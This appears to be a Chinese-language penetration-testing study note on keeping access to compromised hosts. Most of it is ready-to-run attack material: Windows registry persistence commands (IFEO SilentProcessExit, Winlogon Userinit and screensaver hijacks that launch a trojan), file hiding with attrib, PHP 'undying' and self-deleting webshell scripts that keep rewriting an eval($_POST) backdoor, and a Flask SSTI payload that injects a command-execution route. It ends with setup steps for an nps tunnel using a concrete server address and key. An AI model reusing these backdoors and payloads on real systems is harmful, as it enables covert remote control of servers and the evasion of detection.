配合GlobalFlag隐藏：**执行正常关闭后触发后门**

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1

reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "C:\1111.exe"
```

命令完成后随便**触发下记事本**，便上线了

<img src=".\图片\Snipaste_2022-12-24_14-22-03.png" alt="Snipaste_2022-12-24_14-22-03" style="zoom:67%;" />

#### 1、WinLogon配合无文件落地上线

注册表`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`中`Userinit`对应的值是当用户登录时触发的程序可以将该值的后面`加上木马路径`,当触发登录时也就执行了木马

<img src=".\图片\Snipaste_2022-12-24_14-27-08.png" alt="Snipaste_2022-12-24_14-27-08" style="zoom: 67%;" />

在以上路径中加上后门`1111.exe`，可以使用命令加，也可以手动加

```
# 使用命令加上路径
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\System32\userinit.exe,C:\1111.exe"
```

<img src=".\图片\Snipaste_2022-12-24_14-29-07.png" alt="Snipaste_2022-12-24_14-29-07" style="zoom:80%;" />

接下来注销**重新登录触发木马**

<img src=".\图片\Snipaste_2022-12-24_14-31-10.png" alt="Snipaste_2022-12-24_14-31-10" style="zoom:80%;" />

#### 2、利用cs生成powershell payload实现无文件落地上线

在以上操作上，加上`powershell payload`

<img src=".\图片\Snipaste_2022-12-24_14-33-14.png" alt="Snipaste_2022-12-24_14-33-14" style="zoom:80%;" />

```
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /V "Userinit" /t REG_SZ /F /D "C:\Windows\System32\userinit.exe,[powershell payload]"
```

#### 3、屏幕保护生效后执行后门

如果选择了屏幕保护程序那么注册表`HKEY_CURRENT_USER\Control Panel\Desktop`中`SCRNSAVE.EXE`的值就是对应的屏幕保护程序，如果把这个值**改为我们的木马程序**那么**当开启屏幕保护时**也就触发了木马

```
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "C:\1111.exe" /f
```

<img src=".\图片\Snipaste_2022-12-24_14-40-57.png" alt="Snipaste_2022-12-24_14-40-57" style="zoom:67%;" />

### window隐藏技术

使用`Attrib +s +a +h +r`命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。 这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见

```
Attrib +s +a +h +r 1111.exe
```

<img src=".\图片\Snipaste_2022-12-24_14-50-54.png" alt="Snipaste_2022-12-24_14-50-54" style="zoom: 80%;" />

这样算是隐藏，其实还有查看方法

<img src=".\图片\Snipaste_2022-12-24_14-57-22.png" alt="Snipaste_2022-12-24_14-57-22" style="zoom:80%;" />

### Monitor工具

详情见

[F:/暗月渗透/新/渗透测试22%20权限维持篇/windows权限维持.pdf]()

### php不死马

属于web后门

```php
<?php
ignore_user_abort();   //关掉浏览器，PHP脚本也可以继续执行.
set_time_limit(0);     //通过set_time_limit(0)可以让程序无限制的执行下去
$interval = 5;         // 每隔*秒运行
do {
$filename = 'test.php';
if(file_exists($filename)) {
echo "xxx";
}
else {
$file = fopen("test.php", "w");
$txt = "<?php @eval($_POST[\'c\']); ?>\n";  //此处写上一句或者免杀的木马
fwrite($file, $txt);
fclose($file);
}
sleep($interval);
} while (true);
?>
```

### 内存马简单利用

Webshell 内存马，是在内存中写入恶意后门和木马并执行，达到远程控制Web服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的 Webshell 都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马，区别在于 Webshell 内存马是**无文件马**，利用中间件的进程执行某些恶意代码，不会有文件落地，给检测带来巨大难度

内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测，通常被用来做**持久化**，规避检测，持续驻留目标服务器。无文件攻击、内存 Webshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐

#### PHP内存马

```
set_time_limit()  函数：设置允许脚本运行的时间，单位为秒（如果设置该运行时间，sleep()函数在执行程序时的持续时间将会被忽略掉）
ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行（如果设置为True，则忽略与用户的断开）
unlink(FILE)      函数：删除文件（防止文件落地被检测工具查杀）
file_put_contents 函数：将一个字符串写入该文件中
usleep            函数：延迟执行当前脚本数微秒，即条件竞争
```

```php
<?php
ignore_user_abort(true);
set_time_limit(0);
@unlink(__FILE__);
$file = '.HH.php';
$code = '<?php @eval($_POST[\'c\']); ?>';
while (1){
    file_put_contents($file,$code);
    usleep(5000);
}
?>
```

本身文件`Memory_horse_v1`一访问便自动删除了，且在当前目录生成了 `.HH.php` 文件，写入了一句话后门，且**删掉了也会继续生成**，直到服务器重启

<img src=".\图片\Snipaste_2022-12-29_13-14-58.png" alt="Snipaste_2022-12-29_13-14-58" style="zoom:80%;" />

#### Python内存马

https://xz.aliyun.com/t/10933

写入 flask 内存马 `flaskSstiServer.py`

```
from flask import Flask,request
from flask import render_template_string
app = Flask(__name__)

@app.route('/')
def hello_world():
    return 'Hello World'

@app.route('/test',methods=['GET', 'POST'])
def test():
    template = '''
        <div class="center-content error">
            <h1>Oops! That page doesn't exist.</h1>
            <h3>%s</h3>
        </div> 
    ''' %(request.values.get('param'))

    return render_template_string(template)

if __name__ == '__main__':
    app.run(port=8000)   
```

插入路由：

```
http://127.0.0.1:8000/test?param={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}}
```

<img src=".\图片\Snipaste_2022-12-29_13-32-25.png" alt="Snipaste_2022-12-29_13-32-25" style="zoom:80%;" />

访问的参数如下

```
url_for.__globals__['__builtins__']['eval'](
    "app.add_url_rule(
        '/shell', 
        'shell', 
        lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()
    )",
    {
        '_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],
        'app':url_for.__globals__['current_app']
    }
)

```

再访问插入的shell，然而本身目录没有`shell`这个文件

```
http://127.0.0.1:8000/shell?cmd=id
```

<img src=".\图片\Snipaste_2022-12-29_13-34-08.png" alt="Snipaste_2022-12-29_13-34-08" style="zoom:80%;" />

#### Java内存马

1、按攻击思路，大致分为：

-Java Instrumentation类（Agent型）

-Servlet-api类（Servlet型、Filter型、Listener型）

-Spring类（Controller型、Interceptor型）

2、按注入的对象分为：tomcat、weblogic、shiro等类型

**F:\xiaodi\146-权限维持-各语言内存马项目&工具箱等\MemShellDemo-master\MemShellForJava**

## 其它

### nps使用

#### 官网介绍

> Nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。几乎支持所有协议，支持内网http代理、内网socks5代理、p2p等，简洁但功能强大的WEB管理界面，支持服务端、客户端同时控制，扩展功能强大，全平台兼容，一键注册为服务。

<img src=".\图片\d018d0f4f7b2050d9399e96f87a97b83.png" alt="8TFr6I.png" style="zoom:80%;" />

#### 安装服务端

这里只用centos 64位作演示 首页去[官方](https://github.com/ehang-io/nps/releases)找到并复制最新的下载链接

```
# 创建并进入指定目录
cd /path
mkdir nps
cd /path/nps
# 将复制的对应的服务端下载并解压到当前目录
wget https://github.com/ehang-io/nps/releases/download/v0.26.7/linux_amd64_server.tar.gz && tar zxvf linux_amd64_server.tar.gz
# 执行安装命令
sudo ./nps install
# 启动
sudo nps start
```



配置文件参数如下(安装后的配置文件在/etc/nps/conf/nps.conf)： 根据实际情况修改

```
#web管理端口
httpport
#web界面管理密码
password
#服务端客户端通信端口
bridePort
#ssl certFile绝对路径
pemPath
#ssl keyFile绝对路径
keyPath
#域名代理https代理监听端口
httpsProxyPort
#域名代理http代理监听端口
httpProxyPort
#web api免验证IP地址
authip
#客户端与服务端连接方式kcp或tcp
bridgeType
```



修改完配置文件后，重启服务

```
sudo ./nps restart
```



服务端常用命令:

```
# 服务端开始/停止/重启/配置文件重载/卸载服务/安装服务
sudo nps start/stop/restart/reload/uninstall/install
#  服务端更新

sudo nps-update update (请更新前停止服务)
```



默认的web端口是8080，账号是admin/123 提前放开防火墙和云服务的安全策略

```
firewall-cmd --zone=public --add-port=8080/tcp --permanent 
firewall-cmd --reload
```



另外对于服务用到的bridePort，httpsProxyPort，httpProxyPort也最好提前放开，不然客户端是无法请求到服务端的。

#### 客户端使用

首先看看[官方文档](https://ehang-io.github.io/nps/#/use)，了解基本操作和指令。

##### 1、Linux系统

```
# 创建并进入指定目录
cd /path
mkdir npc
cd /path/npc
# 将复制的对应的客户端下载并解压到当前目录
wget https://github.com/ehang-io/nps/releases/download/v0.26.7/linux_amd64_client.tar.gz && tar zxvf linux_amd64_client.tar.gz
```



为了客户端的服务能正确的断网重连，这里使用配置文件的方式启动

配置/conf/npc.conf的内容：(具体的含义和修改请根据官方文档配置)

```
server_addr=89.117.94.85:8024
conn_type=tcp
vkey=1542576819zfY
auto_reconnection=true
max_conn=1000
flow_limit=1000
rate_limit=1000
# crypt=true
# compress=true
```



然后启动注册服务并启动客户端：

```
sudo ./npc install -config=/path/npc/conf/npc.conf
sudo ./npc start
./npc -server=89.117.94.85:8024 -vkey=zf1yolo
```



但是官网这种安装方式只能安装一个npc的客户端，如果需要同时连接多个服务端同时穿透，这种方式就不合适了。 我选择使用Supervisor来配置多个npc客户端同时运行

在/etc/supervisord.d中配置npc-1.ini

```
[program:npc-1]
directory = /path
command = /path/npc -config=/path/npc/conf/npc.conf -debug=false
autostart = true
startsecs = 5
autorestart = true
startretries = 3
user = root
redirect_stderr = true
stdout_logfile_maxbytes = 20MB
stdout_logfile_backups = 20
stdout_logfile = /var/log/npc/npc-1.log
```



完成之后执行

```
# 识别配置文件并启动
supervisorctl reread
supervisorctl update
# 启动
supervisorctl start npc-1
# 查看状态
supervisorctl status npc-1
```



具体的Supervisor安装和使用请参考 [CentOS 7 配置 Supervisor](https://www.chengxulvtu.com/supervisor-on-centos-7/)

##### 2、Windows系统

首先下载win版[windows_amd64_client.tar.gz](https://github.com/ehang-io/nps/releases/download/v0.26.7/windows_amd64_client.tar.gz)并解压。

建议使用GitBash命令行软件的管理员模式来启动。

如果要使用最简单的模式，可以运行官方指导的以下命令。

但是对于我有多个服务器，想同时连接多个nps服务端的话，可以使用单独注册系统服务的方式：

```
# 如果有npc1服务请先删除
sc delete npc1
# 注册npc服务
sc create npc1 binpath= "D:\Apps\npc\npc.exe -server=xxxx -vkey=xxx -type=tcp" start= auto displayname= "npc1"
```



<img src=".\图片\06057fc290cfa432b18d775f0fc29776.png" alt="iShot2020052415.06.39.png" style="zoom:80%;" />

然后鼠标右键底部任务栏，打开任务管理器，找到服务选项，然后底部打开服务，找到npc1,启动服务，并且点开顶部恢复菜单，将第x次失败几个选项都勾选为‘重新启动服务’，即可。 每次需要一个新的npc客户端的时候，按照上述步骤即可。
